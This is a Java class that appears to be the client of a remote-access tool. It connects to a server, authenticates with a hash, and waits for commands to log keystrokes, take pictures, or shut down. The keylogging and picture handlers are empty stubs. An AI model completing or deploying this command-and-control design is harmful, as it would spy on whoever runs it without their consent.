import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

public class Connection {

	// There is only one available connection ever at a time
	private Socket connection;
	private BufferedReader input;
	private DataOutputStream output;

	public Connection(InetAddress address, int port, String hash) throws IOException, InterruptedException {

		// Establish connection
		connection = new Socket(address, port);
		input = new BufferedReader(new InputStreamReader(connection.getInputStream()));
		output = new DataOutputStream(connection.getOutputStream());
		output.flush();
		Thread.sleep(1000);

		// Send auth packet
		output.writeBytes(PacketHeader.AUTH + " " + hash + System.getProperty("line.separator")); 
		System.out.println("AUTHENTICATION PACKET SENT");

		// Waits for server response
		while (true) {
			if (input.ready()) {
				String[] response = input.readLine().split(" ");

				// Checks to see if connection response is valid
				if (response[0].equals(PacketHeader.CONN)) {
					if (response[1].equals(hash)) {
						System.out.println("SERVER RESPONSE RECEIVED");
						break;
					} else {
						System.out.println("ERROR: RESPONSE HASH MISMATCH");
						throw new IOException("Response hash mismatch");
					}
				} else {
					System.out.println("ERROR: INVALID CONNECTION RESPONSE HEADER");
					throw new IOException("Invalid connection response header");
				}
			}
		}

		System.out.println("CONNECTION SUCCSSFULLY ESTABLISHED");
	}

	public void listen() throws IOException {
		try {

			// Waits for server to send a request
			while (true) {
				if (input.ready()) {
					
					// Reads the request header
					String requestHeader = input.readLine();

					// Determines what to do depending on what the header was
					if (requestHeader.equals(PacketHeader.KEYL)) { // If keystroke logging request is received
						
						// Creates a new thread that sends keystrokes to the server
						// If the server sends another KEYL packet, then the thread is stopped
						Thread keyThread = new Thread(new Runnable() {
							@Override
							public void run() {
								
							}
						});
						keyThread.start();
						
						// Listens for the KEYL packet so that the key sending thread can be stopped

					} else if (requestHeader.equals(PacketHeader.PICT)) { // If picture request is received

					} else if (requestHeader.equals(PacketHeader.KILL)) { // If kill request is received
						System.out.println("KILL REQUEST RECEIVED");
						
						// Try to close all input streams
						try {
							input.close();
							output.close();
							connection.close();
						} catch (IOException ioe) {System.out.println("WARNING: I/O streams could not be closed");}
						return;
					}
				}
			}

		} catch (IOException ie) { // If connection was disconnected at any point
			
			// Try to close all input streams
			try {
				input.close();
				output.close();
				connection.close();
			} catch (IOException ioe) {System.out.println("WARNING: I/O streams could not be closed");}
			
			// Tells main method that connection was disconnected
			throw new IOException("Connection disconnected");
		}
	}
}
